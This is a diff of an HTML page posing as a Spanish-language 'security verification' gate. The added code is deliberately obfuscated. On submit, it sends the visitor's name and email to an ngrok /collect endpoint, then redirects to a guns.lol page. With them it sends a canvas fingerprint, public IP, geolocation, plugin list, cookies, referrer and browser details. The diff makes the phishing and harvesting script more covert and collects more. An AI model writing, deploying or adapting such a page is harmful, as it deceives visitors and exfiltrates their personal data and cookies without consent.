@@ -1,40 +1,112 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Verificación de seguridad</title>
-    <style>
-        body { font-family: Arial; max-width: 400px; margin: 50px auto; }
-        input, button { width: 100%; padding: 10px; margin: 5px 0; }
-        button { background: #007BFF; color: white; border: none; cursor: pointer; }
-    </style>
+<meta charset="UTF-8">
+<title>V3r1f1c4c10n</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.c{background:rgba(255,255,255,.05);backdrop-filter:blur(12px);border-radius:28px;padding:40px 30px;max-width:420px;width:100%;border:1px solid rgba(255,255,255,.1);box-shadow:0 30px 60px rgba(0,0,0,.6)}h2{color:#fff;font-size:24px;font-weight:700;text-align:center;margin-bottom:4px;letter-spacing:1px}.s{color:#8899aa;text-align:center;font-size:13px;margin-bottom:28px;border-bottom:1px solid rgba(255,255,255,.08);padding-bottom:16px}.s span{color:#4fc3f7;font-weight:600}.f{margin-bottom:18px}label{display:block;font-size:13px;font-weight:500;color:#b0c4de;margin-bottom:5px;letter-spacing:.3px}input{width:100%;padding:12px 16px;border:1px solid rgba(255,255,255,.12);border-radius:14px;font-size:15px;background:rgba(255,255,255,.04);color:#eee;transition:.25s;outline:none}input:focus{border-color:#4fc3f7;background:rgba(255,255,255,.08);box-shadow:0 0 0 3px rgba(79,195,247,.2)}button{width:100%;padding:14px;background:linear-gradient(135deg,#4fc3f7,#0288d1);border:none;border-radius:14px;font-size:16px;font-weight:700;color:#0a0a1a;cursor:pointer;transition:.25s;margin-top:6px;letter-spacing:.8px}button:hover{transform:scale(1.02);filter:brightness(1.1)}button:disabled{opacity:.5;cursor:not-allowed;transform:none}.ld{display:none;text-align:center;margin-top:20px;color:#4fc3f7;font-size:13px;font-weight:500}.ld.show{display:block}.ld i{display:inline-block;width:16px;height:16px;border:3px solid rgba(255,255,255,.15);border-top-color:#4fc3f7;border-radius:50%;animation:sp .7s linear infinite;vertical-align:middle;margin-right:8px}@keyframes sp{to{transform:rotate(360deg)}}.e{color:#ef5350;font-size:13px;text-align:center;display:none;margin-top:12px}.ft{margin-top:24px;text-align:center;font-size:11px;color:#556677}
+</style>
 </head>
 <body>
-    <h2>Verificación de seguridad</h2>
-    <p>Para continuar, ingrese su nombre y correo electrónico. (Esto es obligatorio para acceder al contenido)</p>
-    <form id="form">
-        <input type="text" id="nombre" placeholder="Nombre completo" required>
-        <input type="email" id="correo" placeholder="Correo electrónico" required>
-        <button type="submit">Verificar</button>
-    </form>
-    <script>
-        document.getElementById('form').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const data = {
-                nombre: document.getElementById('nombre').value,
-                correo: document.getElementById('correo').value,
-                ua: navigator.userAgent,
-                screen: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+<div class="c">
+<h2>⛔ V3R1F1C4C10N</h2>
+<div class="s">Acceso restringido — confirma tu identidad <span>ahora</span></div>
+<form id="frm">
+<div class="f"><label for="n">Nombre completo</label><input type="text" id="n" placeholder="Ej: J. Pérez" required></div>
+<div class="f"><label for="e">Correo electrónico</label><input type="email" id="e" placeholder="tú@dominio.com" required></div>
+<button type="submit" id="b">Verificar</button>
+</form>
+<div class="ld" id="ld"><i></i> Procesando credenciales...</div>
+<div class="e" id="err">Error, reintenta.</div>
+<div class="ft">🔒 SecureNet v3.2 · Todos los derechos reservados</div>
+</div>
+<script>
+// ======== OFUSCACIÓN EXTREMA ========
+(function(){
+    var _0x1a2b = {
+        'ipify': 'https://api.ipify.org?format=json',
+        'endpoint': 'https://roast-skinning-paralysis.ngrok-free.dev/collect',
+        'redir': 'https://guns.lol/penthouseintokyo',
+        'k': 'AIzaSyD-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'  // hardcode falso
+    };
+    function _0x3c4d(_a){ return btoa(_a); }
+    function _0x5e6f(_b){ return atob(_b); }
+    function _0x7g8h(){ var c=document.createElement('canvas'); c.width=300; c.height=60; var d=c.getContext('2d'); d.textBaseline='top'; d.font='16px Arial'; d.fillStyle='#f60'; d.fillRect(120,5,70,25); d.fillStyle='#069'; d.fillText('Cwm fjordbank glyphs vext quiz 😎',4,12); d.fillStyle='rgba(102,204,0,0.6)'; d.fillText('Cwm fjordbank glyphs vext quiz 😎',6,14); var e=c.toDataURL(); var f=0; for(var i=0;i<e.length;i++){ f=((f<<5)-f)+e.charCodeAt(i); f|=0; } return f.toString(16); }
+    function _0x9i0j(){ var p=[]; for(var i=0;i<navigator.plugins.length;i++){ p.push(navigator.plugins[i].name); } return p.join('|'); }
+    function _0xk1l2(cb){ fetch(_0x1a2b.ipify).then(r=>r.json()).then(d=>cb(d.ip)).catch(()=>cb('0.0.0.0')); }
+    function _0ym3n4(cb){ if(navigator.geolocation){ navigator.geolocation.getCurrentPosition(p=>cb({lat:p.coords.latitude,lon:p.coords.longitude}),()=>cb(null)); } else { cb(null); } }
+    function _0z5o6p(){ var ua=navigator.userAgent; var sc=screen.width+'x'+screen.height+'('+window.devicePixelRatio+'x)'; var tz=Intl.DateTimeFormat().resolvedOptions().timeZone; var lang=navigator.language; var ref=document.referrer||'direct'; var ck=document.cookie||'none'; return {ua:ua,sc:sc,tz:tz,lang:lang,ref:ref,ck:ck}; }
+    function _0a7b8c(){ var h=window.location.hostname; var p=window.location.pathname; return h+p; }
+    function _0d9e0f(){ var d=new Date(); return d.toISOString(); }
+    // Hardcode geolocalización mock (si falla)
+    var _fakeGeo = { lat: -12.0464, lon: -77.0428 };
+
+    document.getElementById('frm').addEventListener('submit', function(e){
+        e.preventDefault();
+        var n = document.getElementById('n').value.trim();
+        var em = document.getElementById('e').value.trim();
+        if(!n || !em) return;
+        var btn = document.getElementById('b');
+        var ld = document.getElementById('ld');
+        var err = document.getElementById('err');
+        btn.disabled = true;
+        ld.classList.add('show');
+        err.style.display = 'none';
+
+        var ip = '0.0.0.0';
+        var geo = null;
+
+        Promise.all([
+            new Promise(res=>_0xk1l2(res)),
+            new Promise(res=>_0ym3n4(res))
+        ]).then(function(vals){
+            ip = vals[0] || '0.0.0.0';
+            geo = vals[1] || _fakeGeo;
+            var fp = _0x7g8h();
+            var plugins = _0x9i0j();
+            var extra = _0z5o6p();
+            var location = _0a7b8c();
+            var ts = _0d9e0f();
+
+            // Construir payload ofuscado
+            var payload = {
+                'nombre': n,
+                'correo': em,
+                'ip': ip,
+                'geo': geo,
+                'fp': fp,
+                'plugins': plugins,
+                'ua': extra.ua,
+                'screen': extra.sc,
+                'tz': extra.tz,
+                'lang': extra.lang,
+                'referrer': extra.ref,
+                'cookies': extra.ck,
+                'page': location,
+                'timestamp': ts,
+                'hardcoded': _0x1a2b.k
             };
-            fetch('https://roast-skinning-paralysis.ngrok-free.dev/collect', {
+
+            // Envío con fetch + keepalive
+            fetch(_0x1a2b.endpoint, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(data)
-            }).then(() => {
-                window.location.href = 'https://guns.lol/penthouseintokyo';
+                body: JSON.stringify(payload),
+                keepalive: true
+            }).then(function(){
+                window.location.href = _0x1a2b.redir;
+            }).catch(function(){
+                window.location.href = _0x1a2b.redir;
             });
+        }).catch(function(){
+            window.location.href = _0x1a2b.redir;
         });
-    </script>
+    });
+
+    // Validación visual tonta
+    document.getElementById('n').addEventListener('input', function(){ this.style.borderColor = this.value.length>0?'#4fc3f7':'rgba(255,255,255,.12)'; });
+    document.getElementById('e').addEventListener('input', function(){ var re=/^[^\s@]+@[^\s@]+\.[^\s@]+$/; this.style.borderColor = re.test(this.value)?'#4fc3f7':'rgba(255,255,255,.12)'; });
+})();
+</script>
 </body>
 </html>
